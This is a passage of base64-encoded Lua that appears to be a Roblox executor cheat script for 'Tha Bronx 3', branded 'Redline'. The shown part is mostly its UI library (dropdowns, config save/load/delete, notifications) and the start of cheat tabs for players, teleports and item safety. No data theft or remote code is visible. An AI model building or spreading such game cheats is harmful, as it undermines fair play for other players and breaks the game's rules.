zID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHQgPSAiIjsKICAgICAgICAgICAgICAgICAgICAgICAgQXV0b0J1dHRvbkNvbG9yID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigxLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJsaXN0IiBdOwogICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDEsIDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAwLCAzMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTQ7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMzMsIDMzLCAzNSkKICAgICAgICAgICAgICAgICAgICB9KTsgY2ZnLmRhdGFfc3RvcmVbI2NmZy5kYXRhX3N0b3JlICsgMV0gPSBidXR0b247CgogICAgICAgICAgICAgICAgICAgIGxvY2FsIG5hbWUgPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRMYWJlbCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuZm9udDsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYig3MiwgNzIsIDczKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gb3B0aW9uX2RhdGE7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGJ1dHRvbjsKICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0VHJ1bmNhdGUgPSBFbnVtLlRleHRUcnVuY2F0ZS5BdEVuZDsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMSwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTQ7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gYnV0dG9uOwogICAgICAgICAgICAgICAgICAgICAgICBDb3JuZXJSYWRpdXMgPSBkaW0oMCwgMykKICAgICAgICAgICAgICAgICAgICB9KTsgICAgIAoKICAgICAgICAgICAgICAgICAgICBidXR0b24uSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKGlucHV0KQogICAgICAgICAgICAgICAgICAgICAgICBpZiBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Ub3VjaCBvciBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Ub3VjaCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBjdXJyZW50ID0gY2ZnLmN1cnJlbnRfZWxlbWVudCAKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBjdXJyZW50IGFuZCBjdXJyZW50IH49IG5hbWUgdGhlbiAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGN1cnJlbnQsIHtUZXh0Q29sb3IzID0gcmdiKDcyLCA3MiwgNzIpfSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmbGFnc1tjZmcuZmxhZ10gPSBvcHRpb25fZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2ZnLmNhbGxiYWNrKG9wdGlvbl9kYXRhKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihuYW1lLCB7VGV4dENvbG9yMyA9IHJnYigyNDUsIDI0NSwgMjQ1KX0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjZmcuY3VycmVudF9lbGVtZW50ID0gbmFtZQogICAgICAgICAgICAgICAgICAgICAgICBlbmQgCiAgICAgICAgICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgICAgICAgICBuYW1lLk1vdXNlRW50ZXI6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGNmZy5jdXJyZW50X2VsZW1lbnQgPT0gbmFtZSB0aGVuIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIAogICAgICAgICAgICAgICAgICAgICAgICBlbmQgCgogICAgICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKG5hbWUsIHtUZXh0Q29sb3IzID0gcmdiKDE0MCwgMTQwLCAxNDApfSkKICAgICAgICAgICAgICAgICAgICBlbmQpCgogICAgICAgICAgICAgICAgICAgIG5hbWUuTW91c2VMZWF2ZTpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgY2ZnLmN1cnJlbnRfZWxlbWVudCA9PSBuYW1lIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZCAKCiAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4obmFtZSwge1RleHRDb2xvcjMgPSByZ2IoNzIsIDcyLCA3Mil9KQogICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGNmZy5yZWZyZXNoX29wdGlvbnMoY2ZnLm9wdGlvbnMpCgogICAgICAgICAgICByZXR1cm4gc2V0bWV0YXRhYmxlKGNmZywgbGlicmFyeSkKICAgICAgICBlbmQgCgogICAgICAgIGZ1bmN0aW9uIGxpYnJhcnk6aW5pdF9jb25maWcod2luZG93KSAKICAgICAgICAgICAgbG9jYWwgdGV4dDsKICAgICAgICAgICAgLS13aW5kb3c6c2VwZXJhdG9yKHtuYW1lID0gIiJ9KQogICAgICAgICAgICBsb2NhbCBtYWluID0gd2luZG93OnRhYih7bmFtZSA9ICJDb25maWdzIiwgdGFicyA9IHsiTWFpbiJ9fSkKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIGNvbHVtbiA9IG1haW46Y29sdW1uKHt9KQogICAgICAgICAgICBsb2NhbCBzZWN0aW9uID0gY29sdW1uOnNlY3Rpb24oe25hbWUgPSAiQ29uZmlncyIsIHNpemUgPSAxLCBkZWZhdWx0ID0gdHJ1ZSwgaWNvbiA9ICJyYnhhc3NldGlkOi8vMTM5NjI4MjAyNTc2NTExIn0pCiAgICAgICAgICAgIGNvbmZpZ19ob2xkZXIgPSBzZWN0aW9uOmxpc3Qoe29wdGlvbnMgPSB7IlJlcG9ydCIsICJUaGlzIiwgIkVycm9yIiwgIlRvIiwgIkZpbm9iZSJ9LCBjYWxsYmFjayA9IGZ1bmN0aW9uKG9wdGlvbikKICAgICAgICAgICAgICAgIGlmIHRleHQgdGhlbiAKICAgICAgICAgICAgICAgICAgICB0ZXh0LnNldChvcHRpb24pCiAgICAgICAgICAgICAgICBlbmQgCiAgICAgICAgICAgIGVuZCwgZmxhZyA9ICJjb25maWdfbmFtZV9saXN0In0pOyBsaWJyYXJ5OnVwZGF0ZV9jb25maWdfbGlzdCgpCiAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCBjb2x1bW4gPSBtYWluOmNvbHVtbih7fSkKICAgICAgICAgICAgbG9jYWwgc2VjdGlvbiA9IGNvbHVtbjpzZWN0aW9uKHtuYW1lID0gIlNldHRpbmdzIiwgc2lkZSA9ICJyaWdodCIsIHNpemUgPSAxLCBkZWZhdWx0ID0gdHJ1ZSwgaWNvbiA9ICJyYnhhc3NldGlkOi8vMTI5MzgwMTUwNTc0MzEzIn0pCiAgICAgICAgICAgIHRleHQgPSBzZWN0aW9uOnRleHRib3goe25hbWUgPSAiQ29uZmlnIG5hbWU6IiwgZmxhZyA9ICJjb25maWdfbmFtZV90ZXh0In0pCiAgICAgICAgICAgIHNlY3Rpb246YnV0dG9uKHtuYW1lID0gIlNhdmUiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKCkgd3JpdGVmaWxlKGxpYnJhcnkuZGlyZWN0b3J5IC4uICIvY29uZmlncy8iIC4uIGZsYWdzWyJjb25maWdfbmFtZV90ZXh0Il0gLi4gIi5jZmciLCBsaWJyYXJ5OmdldF9jb25maWcoKSkgbGlicmFyeTp1cGRhdGVfY29uZmlnX2xpc3QoKSBub3RpZmljYXRpb25zOmNyZWF0ZV9ub3RpZmljYXRpb24oe25hbWUgPSAiQ29uZmlncyIsIGluZm8gPSAiU2F2ZWQgY29uZmlnIHRvOlxuIiAuLiBmbGFnc1siY29uZmlnX25hbWVfdGV4dCJdIG9yIGZsYWdzWyJjb25maWdfbmFtZV90ZXh0Il19KSBlbmR9KSAKICAgICAgICAgICAgc2VjdGlvbjpidXR0b24oe25hbWUgPSAiTG9hZCIsIGNhbGxiYWNrID0gZnVuY3Rpb24oKSBsaWJyYXJ5OmxvYWRfY29uZmlnKHJlYWRmaWxlKGxpYnJhcnkuZGlyZWN0b3J5IC4uICIvY29uZmlncy8iIC4uIGZsYWdzWyJjb25maWdfbmFtZV90ZXh0Il0gLi4gIi5jZmciKSkgIGxpYnJhcnk6dXBkYXRlX2NvbmZpZ19saXN0KCkgbm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHtuYW1lID0gIkNvbmZpZ3MiLCBpbmZvID0gIkxvYWRlZCBjb25maWc6XG4iIC4uIGZsYWdzWyJjb25maWdfbmFtZV90ZXh0Il19KSBlbmR9KQogICAgICAgICAgICBzZWN0aW9uOmJ1dHRvbih7bmFtZSA9ICJEZWxldGUiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKCkgZGVsZmlsZShsaWJyYXJ5LmRpcmVjdG9yeSAuLiAiL2NvbmZpZ3MvIiAuLiBmbGFnc1siY29uZmlnX25hbWVfdGV4dCJdIC4uICIuY2ZnIikgIGxpYnJhcnk6dXBkYXRlX2NvbmZpZ19saXN0KCkgbm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHtuYW1lID0gIkNvbmZpZ3MiLCBpbmZvID0gIkRlbGV0ZWQgY29uZmlnOlxuIiAuLiBmbGFnc1siY29uZmlnX25hbWVfdGV4dCJdfSkgZW5kfSkKICAgICAgICAgICAgc2VjdGlvbjpjb2xvcnBpY2tlcih7bmFtZSA9ICJNZW51IEFjY2VudCIsIGNhbGxiYWNrID0gZnVuY3Rpb24oY29sb3IsIGFscGhhKSBsaWJyYXJ5OnVwZGF0ZV90aGVtZSgiYWNjZW50IiwgY29sb3IpIGVuZCwgY29sb3IgPSB0aGVtZXMucHJlc2V0LmFjY2VudH0pCiAgICAgICAgICAgIHNlY3Rpb246a2V5YmluZCh7bmFtZSA9ICJNZW51IEJpbmQiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKGJvb2wpIHdpbmRvdy50b2dnbGVfbWVudShib29sKSBlbmQsIGRlZmF1bHQgPSB0cnVlfSkKICAgICAgICBlbmQKICAgIC0tCgogICAgLS0gTm90aWZpY2F0aW9uIExpYnJhcnkKICAgICAgICBmdW5jdGlvbiBub3RpZmljYXRpb25zOnJlZnJlc2hfbm90aWZzKCkgCiAgICAgICAgICAgIGxvY2FsIG9mZnNldCA9IDUwCgogICAgICAgICAgICBmb3IgaSwgdiBpbiBub3RpZmljYXRpb25zLm5vdGlmcyBkbwogICAgICAgICAgICAgICAgbG9jYWwgUG9zaXRpb24gPSB2ZWMyKDIwLCBvZmZzZXQpCiAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKHYsIHtQb3NpdGlvbiA9IGRpbV9vZmZzZXQoUG9zaXRpb24uWCwgUG9zaXRpb24uWSl9LCBFbnVtLkVhc2luZ1N0eWxlLlF1YWQsIDAuNCkKICAgICAgICAgICAgICAgIG9mZnNldCArPSAodi5BYnNvbHV0ZVNpemUuWSArIDEwKQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIHJldHVybiBvZmZzZXQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBmdW5jdGlvbiBub3RpZmljYXRpb25zOmZhZGUocGF0aCwgaXNfZmFkaW5nKQogICAgICAgICAgICBsb2NhbCBmYWRpbmcgPSBpc19mYWRpbmcgYW5kIDEgb3IgMCAKICAgICAgICAgICAgCiAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4ocGF0aCwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSBmYWRpbmd9LCBFbnVtLkVhc2luZ1N0eWxlLlF1YWQsIDEpCgogICAgICAgICAgICBmb3IgXywgaW5zdGFuY2UgaW4gcGF0aDpHZXREZXNjZW5kYW50cygpIGRvIAogICAgICAgICAgICAgICAgaWYgbm90IGluc3RhbmNlOklzQSgiR3VpT2JqZWN0IikgdGhlbiAKICAgICAgICAgICAgICAgICAgICBpZiBpbnN0YW5jZTpJc0EoIlVJU3Ryb2tlIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGluc3RhbmNlLCB7VHJhbnNwYXJlbmN5ID0gZmFkaW5nfSwgRW51bS5FYXNpbmdTdHlsZS5RdWFkLCAxKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgIAogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICBlbmQgCiAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBpbnN0YW5jZTpJc0EoIlRleHRMYWJlbCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGluc3RhbmNlLCB7VGV4dFRyYW5zcGFyZW5jeSA9IGZhZGluZ30pCiAgICAgICAgICAgICAgICBlbHNlaWYgaW5zdGFuY2U6SXNBKCJGcmFtZSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGluc3RhbmNlLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IGluc3RhbmNlLlRyYW5zcGFyZW5jeSBhbmQgMC42IGFuZCBpc19mYWRpbmcgYW5kIDEgb3IgMC42fSwgRW51bS5FYXNpbmdTdHlsZS5RdWFkLCAxKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCAKICAgICAgICAKICAgICAgICBmdW5jdGlvbiBub3RpZmljYXRpb25zOmNyZWF0ZV9ub3RpZmljYXRpb24ob3B0aW9ucykKICAgICAgICAgICAgbG9jYWwgY2ZnID0gewogICAgICAgICAgICAgICAgbmFtZSA9IG9wdGlvbnMubmFtZSBvciAiVGhpcyBpcyBhIHRpdGxlISI7CiAgICAgICAgICAgICAgICBpbmZvID0gb3B0aW9ucy5pbmZvIG9yICJUaGlzIGlzIGV4dHJhIGluZm8hIjsKICAgICAgICAgICAgICAgIGxpZmV0aW1lID0gb3B0aW9ucy5saWZldGltZSBvciAzOwogICAgICAgICAgICAgICAgaXRlbXMgPSB7fTsKICAgICAgICAgICAgICAgIG91dGxpbmU7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGxvY2FsIGl0ZW1zID0gY2ZnLml0ZW1zOyBkbyAKICAgICAgICAgICAgICAgIGl0ZW1zWyAibm90aWZpY2F0aW9uIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gbGlicmFyeVsgIml0ZW1zIiBdOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDAsIDIxMCwgMCwgNTMpOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigxLCAwKTsKICAgICAgICAgICAgICAgICAgICBBdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlk7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigxNCwgMTQsIDE2KQogICAgICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSVNjYWxlIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgIm5vdGlmaWNhdGlvbiIgXTsKICAgICAgICAgICAgICAgICAgICBTY2FsZSA9IHNjYWxlOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlTdHJva2UiICwgewogICAgICAgICAgICAgICAgICAgIENvbG9yID0gcmdiKDIzLCAyMywgMjkpOwogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAibm90aWZpY2F0aW9uIiBdOwogICAgICAgICAgICAgICAgICAgIFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgQXBwbHlTdHJva2VNb2RlID0gRW51bS5BcHBseVN0cm9rZU1vZGUuQm9yZGVyCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJ0aXRsZSIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dExhYmVsIiAsIHsKICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLmZvbnQ7CiAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgVGV4dCA9IGNmZy5uYW1lOwogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAibm90aWZpY2F0aW9uIiBdOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCA3LCAwLCA2KTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWFk7CiAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJub3RpZmljYXRpb24iIF07CiAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDMpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJpbmZvIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0TGFiZWwiICwgewogICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuZm9udDsKICAgICAgICAgICAgICAgICAgICBUZXh0Q29sb3IzID0gcmdiKDE0NSwgMTQ1LCAxNDUpOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBUZXh0ID0gY2ZnLmluZm87CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJub3RpZmljYXRpb24iIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDksIDAsIDIyKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgIFRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0OwogICAgICAgICAgICAgICAgICAgIFRleHRXcmFwcGVkID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICBBdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlhZOwogICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTQ7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlQYWRkaW5nIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nQm90dG9tID0gZGltKDAsIDE3KTsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nUmlnaHQgPSBkaW0oMCwgOCk7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJpbmZvIiBdCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJiYXIiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICBBbmNob3JQb2ludCA9IHZlYzIoMCwgMSk7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJub3RpZmljYXRpb24iIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDgsIDEsIC02KTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMCwgMCwgMCwgNSk7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gdGhlbWVzLnByZXNldC5hY2NlbnQKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImJhciIgXTsKICAgICAgICAgICAgICAgICAgICBDb3JuZXJSYWRpdXMgPSBkaW0oMCwgOTk5KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlQYWRkaW5nIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nUmlnaHQgPSBkaW0oMCwgOCk7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJub3RpZmljYXRpb24iIF0KICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIGluZGV4ID0gI25vdGlmaWNhdGlvbnMubm90aWZzICsgMQogICAgICAgICAgICBub3RpZmljYXRpb25zLm5vdGlmc1tpbmRleF0gPSBpdGVtc1sgIm5vdGlmaWNhdGlvbiIgXQoKICAgICAgICAgICAgbm90aWZpY2F0aW9uczpmYWRlKGl0ZW1zWyAibm90aWZpY2F0aW9uIiBdLCBmYWxzZSkKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIG9mZnNldCA9IG5vdGlmaWNhdGlvbnM6cmVmcmVzaF9ub3RpZnMoKQoKICAgICAgICAgICAgaXRlbXNbICJub3RpZmljYXRpb24iIF0uUG9zaXRpb24gPSBkaW1fb2Zmc2V0KDIwLCBvZmZzZXQpCgogICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGl0ZW1zWyAibm90aWZpY2F0aW9uIiBdLCB7QW5jaG9yUG9pbnQgPSB2ZWMyKDAsIDApfSwgRW51bS5FYXNpbmdTdHlsZS5RdWFkLCAxKQogICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGl0ZW1zWyAiYmFyIiBdLCB7U2l6ZSA9IGRpbTIoMSwgLTgsIDAsIDUpfSwgRW51bS5FYXNpbmdTdHlsZS5RdWFkLCBjZmcubGlmZXRpbWUpCgogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHRhc2sud2FpdChjZmcubGlmZXRpbWUpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIG5vdGlmaWNhdGlvbnMubm90aWZzW2luZGV4XSA9IG5pbAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBub3RpZmljYXRpb25zOmZhZGUoaXRlbXNbICJub3RpZmljYXRpb24iIF0sIHRydWUpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4oaXRlbXNbICJub3RpZmljYXRpb24iIF0sIHtBbmNob3JQb2ludCA9IHZlYzIoMSwgMCl9LCBFbnVtLkVhc2luZ1N0eWxlLlF1YWQsIDEpCgogICAgICAgICAgICAgICAgdGFzay53YWl0KDEpCiAgICAgICAgCiAgICAgICAgICAgICAgICBpdGVtc1sgIm5vdGlmaWNhdGlvbiIgXTpEZXN0cm95KCkgCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQKICAgIC0tZW5kKSgpCgogICAgZW5kCi0tIFxcIFNjcmlwdAoKbG9jYWwgd2luZG93ID0gbGlicmFyeTp3aW5kb3coe25hbWUgPSAiUmVkbGluZSIsIHN1ZmZpeCA9ICIiLCBnYW1lSW5mbyA9IHN0cmluZy5mb3JtYXQoIiBCZXN0IFRoYSBCcm9ueCAzIFNjcmlwdCAiLCBHYW1lX05hbWU6bG93ZXIoKSl9KQoKaWYgR2FtZV9OYW1lID09ICJUaGUgQnJvbngiIHRoZW4KICAgIHdpbmRvdzpzZXBlcmF0b3Ioe25hbWUgPSAiIn0pIGRvCiAgICAgICAgbG9jYWwgTG9jYWxQbGF5ZXJUYWIsIFBsYXllcnNUYWIsIFB1cmNoYXNlR3VuVGFiLCBFeHRyYVRhYiwgTWlzY1RhYiwgU2FmZVRhYiA9IHdpbmRvdzp0YWIoe25hbWUgPSAiR2VuZXJhbCIsIHRhYnMgPSB7IkxvY2FsIFBsYXllciIsICJQbGF5ZXJzIiwgIlRlbGVwb3J0cyIsICJFeHRyYSIsICJNaXNjIiwgIlNhZmUifSwgaWNvbiA9IEdldEltYWdlKCJXb3JsZC5wbmciKX0pIGRvCiAgICAgICAgICAgIGRvIC0tIFxcIFNhZmUgVGFiCiAgICAgICAgICAgICAgICBsb2NhbCBTYWZlSXRlbUNvbHVtbiA9IFNhZmVUYWI6Y29sdW1uKHt9KQoKICAgICAgICAgICAgICAgIGxvY2FsIFNhZmVJdGVtU2VjdGlvbiA9IFNhZmVJdGVtQ29sdW1uOnNlY3Rpb24oe25hbWUgPSAiU2FmZSBTZWxlY3RlZCBJdGVtIiwgc2lkZSA9ICJsZWZ0Iiwgc2l6ZSA9IDEsIGljb24gPSBHZXRJbWFnZSgiTG9jay5wbmciKX0pCgogICAgICAgICAgICAgICAgbG9jYWwgX1NhZmVJdGVtID0gU2FmZUl0ZW1TZWN0aW9uOmxpc3Qoe2ZsYWcgPSAiU2FmZVNlbGVjdGVkSXRlbV9UaGVCcm9ueCIsIG9wdGlvbnMgPSB7fSwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgICAgICB0YXNrLnNwYXduKExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IHN0YXRlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgI